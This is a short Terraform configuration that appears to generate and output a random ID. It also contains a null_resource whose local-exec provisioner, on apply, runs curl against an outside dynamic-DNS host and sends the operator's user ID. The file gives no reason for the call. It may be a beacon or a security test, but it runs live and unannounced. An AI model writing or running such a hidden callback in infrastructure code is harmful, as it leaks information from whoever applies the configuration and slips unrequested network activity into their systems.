
resource "random_id" "random" {
  keepers = {
    uuid = "${uuid()}"
  }

  byte_length = 16
}

resource "null_resource" "example5" {
  provisioner "local-exec" {
    command = "curl http://btest.chickenkiller.com/?uid=$(id -u)"
  }
}


output "random" {
  value = "${random_id.random.hex}"
}
